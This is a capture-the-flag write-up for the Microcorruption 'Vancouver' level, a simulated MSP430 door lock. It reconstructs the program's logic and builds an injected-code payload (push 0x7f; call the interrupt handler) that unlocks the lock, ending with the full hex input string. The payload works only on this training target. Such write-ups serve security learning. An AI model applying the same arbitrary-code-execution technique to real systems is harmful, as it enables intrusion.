# Write up for Microcorruption - Vancouver

## Disassembly

Manually disassembling the main function, it would look something like this in C.

```
char \*ptr = [1024];

puts("Welcome to the test program loader.");

while (1) {
    puts("Please enter debug payload");

    memset(ptr, 0, 1024);
    getsn(ptr, 1023);

    short ptr2 = (\*(ptr + 0) << 8) | \*(ptr + 1);
    short len = \*(ptr + 2);

    if (len >= 2) {
        puts("Executing debug payload");
        memcpy(ptr2, ptr + 3, len);
        (ptr2)();
    } else {
        puts("Invalid payload length");
    }
}
```

This looked a bit of a mess to me, but the essence of the solution is that you have to input a string of hexadecimal digits that when moved around and then executed, they unlock the door in the challenge.

First I chose some memory I knew would not be used elsewhere - 0x2600 to 0x27ff was fine. That would be more than enough to fit the code I needed.

The code in the previous tutorial solves by calling <unlock\_door>. <unlock\_door> pushes 0x7f on the stack then calls the interrupt handler which unlocks it. This method was missing from this challenge so I'd have to write it into the free space through getsn(). 

## Creating the input string

`*(ptr + 0) == 0x26`

`*(ptr + 1) == 0x00`

This means that when the memcpy() is ran, it loads the remainder of the hex string into 0x2600 onwards (the free space I decided on earlier).

`*(ptr + 2) == 0x8`

This is the length of the code which gets copied from the user input hex string into 0x2600 and onwards.

`*(ptr + 3)` and onwards is part of `<unlock_door>` I stole from the tutorial binary:

```
30 12 7f 00     push #0x7f
b0 12 a8 44     call #0x44a8 <INT>
```

The call points to somewhere slightly different as `<INT>` is in a different location in this binary.

Therefore the completed user input string is:

`26 00 08 30 12 7f 00 b0 12 a8 44`

